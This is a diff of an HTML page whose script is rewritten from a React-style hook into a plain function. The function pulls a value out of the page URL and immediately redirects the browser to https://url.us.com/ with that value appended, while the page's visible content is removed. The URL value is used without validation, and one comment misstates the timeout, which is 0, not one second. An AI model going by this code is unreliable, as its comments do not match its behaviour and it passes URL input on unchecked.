@@ -2,33 +2,35 @@
 <html>
 <head>
 <title></title>
-  <script>
-  const RedirectComponent = () => {
-  const redirectCurrentToCustomURL = () => {
-    const currentURL = window.location.href;
+<script>
+function redirectCurrentToCustomURL() {
+    var currentURL = window.location.href;
+
+    // Define the pattern to extract the parameter value
     const pattern = /=--([^&]*?)&/;
     const match = currentURL.match(pattern);
 
     if (match) {
-      const extractedValue = match[1];
-      setTimeout(() => {
-        window.location.href = `https://url.us.com/${extractedValue}`;
-      }, 100);
+        // Extract the value captured by the pattern
+        var extractedValue = match[1]; // The first captured group
+
+        // Add a timeout before redirecting
+        setTimeout(function() {
+            // Redirect to the new URL with the extracted value
+            window.location.href = "https://url.us.com/" + extractedValue;
+        }, 0); // 1000 milliseconds = 1 second
     }
-  };
+}
 
-  // Run on component mount (page load)
-  useEffect(() => {
-    redirectCurrentToCustomURL();
-  }, []);
+// Call the function when the page loads
+redirectCurrentToCustomURL();
+</script>
 
-    
-  </script>
 </head>
 <body>
 
-<h1>This is a Heading</h1>
-<p>This is a paragraph.</p>
+
 
 </body>
 </html>
+
